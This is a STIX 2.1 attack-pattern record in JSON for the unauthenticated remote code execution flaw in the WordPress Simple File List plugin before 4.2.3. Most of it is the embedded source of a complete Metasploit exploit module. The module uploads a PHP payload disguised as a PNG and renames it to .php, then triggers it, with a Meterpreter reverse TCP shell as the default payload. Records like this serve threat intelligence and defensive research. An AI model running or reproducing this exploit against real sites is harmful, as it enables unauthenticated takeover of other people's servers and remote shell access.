{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ffb5f88-9190-44b1-adb6-a82ae248dda9",
    "created": "2024-08-14T17:10:09.927315Z",
    "modified": "2024-08-14T17:10:09.927319Z",
    "name": "WordPress Simple File List Unauthenticated Remote Code Execution",
    "description": " Simple File List (simple-file-list) plugin before 4.2.3 for WordPress allows remote unauthenticated attackers to upload files within a controlled list of extensions.  However, the rename function does not conform to the file extension restrictions, thus allowing arbitrary PHP code to be uploaded first as a png then renamed to php and executed.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_simple_file_list_rce.rb",
            "external_id": "wp_simple_file_list_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wpscan.com/vulnerability/10192"
        },
        {
            "source_name": "reference",
            "url": "https://www.cybersecurity-help.cz/vdb/SB2020042711"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2286920/simple-file-list"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Simple File List Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          Simple File List (simple-file-list) plugin before 4.2.3 for WordPress allows remote unauthenticated attackers\n          to upload files within a controlled list of extensions.  However, the rename function does not conform to\n          the file extension restrictions, thus allowing arbitrary PHP code to be uploaded first as a png then renamed\n          to php and executed.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'coiffeur', # initial discovery and PoC\n          'h00die', # msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://wpscan.com/vulnerability/10192' ],\n          [ 'URL', 'https://www.cybersecurity-help.cz/vdb/SB2020042711' ],\n          [ 'URL', 'https://plugins.trac.wordpress.org/changeset/2286920/simple-file-list' ],\n          [ 'EDB', '48349' ]\n        ],\n        'Platform' => [ 'php' ],\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [\n            'Default',\n            {\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-04-27',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Base path to WordPress installation', '/']),\n      ]\n    )\n  end\n\n  def dir_path\n    '/wp-content/uploads/simple-file-list/'\n  end\n\n  def upload_path\n    '/wp-content/plugins/simple-file-list/ee-upload-engine.php'\n  end\n\n  def move_path\n    '/wp-content/plugins/simple-file-list/ee-file-engine.php'\n  end\n\n  def upload(filename)\n    print_status('Attempting to upload the PHP payload as a PNG file')\n    now = Date.today.to_time.to_i.to_s\n    data = Rex::MIME::Message.new\n    data.add_part('1', nil, nil, 'form-data; name=\"eeSFL_ID\"')\n    data.add_part(dir_path, nil, nil, 'form-data; name=\"eeSFL_FileUploadDir\"')\n    data.add_part(now, nil, nil, 'form-data; name=\"eeSFL_Timestamp\"')\n    data.add_part(Digest::MD5.hexdigest(\"unique_salt#{now}\"), nil, nil, 'form-data; name=\"eeSFL_Token\"')\n    data.add_part(\"#{payload.encoded}\\n\", 'image/png', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{filename}.png\\\"\")\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, upload_path),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}\") unless res.code == 200\n    # the server will respond with a 200, but if the timestamp and token dont match it wont give back SUCCESS as it failed\n    fail_with(Failure::UnexpectedReply, \"#{peer} - File failed to upload\") unless res.body.include?('SUCCESS')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, dir_path, \"#{filename}.png\"),\n      'method' => 'GET'\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect\") unless res\n    # 404 could be AV got it or something similar\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}.  File was uploaded successfully, but could not be found.\") if res.code == 404\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    print_good('PNG payload successfully uploaded')\n  end\n\n  def rename(filename)\n    print_status(\"Attempting to rename #{filename}.png to #{filename}.php\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, move_path),\n      'method' => 'POST',\n      'vars_post' => {\n        'eeSFL_ID' => 1,\n        'eeFileOld' => \"#{filename}.png\",\n        'eeListFolder' => '/',\n        'eeFileAction' => \"Rename|#{filename}.php\"\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    print_good(\"Successfully renamed #{filename}.png to #{filename}.php\")\n  end\n\n  def check\n    return CheckCode::Unknown unless wordpress_and_online?\n\n    # check the plugin version from readme\n    check_plugin_version_from_readme('simple-file-list', '4.2.3', '1.0.1')\n  end\n\n  def exploit\n    # filename of the file to be uploaded/created\n    filename = Rex::Text.rand_text_alphanumeric(8)\n    register_file_for_cleanup(\"#{filename}.php\")\n\n    upload(filename)\n    rename(filename)\n    print_status('Triggering shell')\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, dir_path, \"#{filename}.php\"),\n      'method' => 'GET'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-27",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}